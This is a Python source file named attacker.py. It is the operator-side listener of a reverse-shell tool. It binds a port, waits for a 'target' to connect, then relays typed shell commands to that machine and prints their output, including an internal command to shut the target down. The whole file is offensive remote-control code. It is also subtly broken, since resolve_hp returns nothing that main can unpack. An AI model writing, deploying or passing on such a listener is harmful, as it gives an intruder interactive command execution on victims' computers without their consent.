# ========================================================================
# $File: attacker.py $
# $Date: 2019-01-21 23:03:34 $
# $Revision: $
# $Creator: Jen-Chieh Shen $
# $Notice: See LICENSE.txt for modification and distribution information
#                   Copyright © 2019 by Shen, Jen-Chieh $
# ========================================================================

import socket
import sys
import os
import locale

import command
import constant
import logger


LISTEN_COUNT = 1


def process_cmd_continue(in_cmd):
    """Process commmand that need to be continue.

    @param { stirng } in_cmd : Command string.
    """

    # No need to receive if just changing the directory.
    if "cd" in in_cmd:
        return True

    if in_cmd == "cls" or in_cmd == "clear":
        os.system('cls')
        os.system('clear')
        return True

    return False

def resolve_hp():
    """Resolve host and port.
    """
    # Resolve arguments.
    arg_len = len(sys.argv)

    if 2 <= arg_len:
        port = int(sys.argv[1])
    else:
        port = constant.PORT


def main():
    """Program Entry point."""

    host, port = resolve_hp()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', port))
        s.listen(LISTEN_COUNT)

        logger.info(f"Bind port: {port}")

        while True:
            logger.info(f"Waiting target... : {LISTEN_COUNT}")
            conn, addr = s.accept()
            with conn:
                logger.info(f"New target => {addr}")
                while True:
                    # Receive shell info.
                    path = conn.recv(constant.BUF_SIZE).decode(constant.DECODE_TYPE)

                    # Get input command.
                    in_cmd = input(path + "$ ")

                    # Check if is internal command type.
                    iic = command.is_internal_command(in_cmd)

                    # Check exit command before sending.
                    if iic:
                        # Remove prefix, get the real command.
                        in_cmd = in_cmd[1:]

                        if in_cmd == command.Command.EXIT.value:
                            break
                        else:
                            logger.error(f"'{in_cmd}' is not recognized internal command.")

                    # Send it.
                    conn.sendall(in_cmd.encode(constant.ENCODE_TYPE))

                    # Check shutdown command before receiving.
                    if iic:
                        if in_cmd == command.Command.SHUTDOWN.value:
                            print("Attacker shutdown the target...")
                            break
                        else:
                            logger.error(f"'{in_cmd}' is not recognized internal command.")

                    if process_cmd_continue(in_cmd):
                        continue

                    # Receive shell command output.
                    outs = conn.recv(constant.BUF_SIZE).decode(constant.DECODE_TYPE)

                    print(outs)

if __name__ == "__main__":
    main()
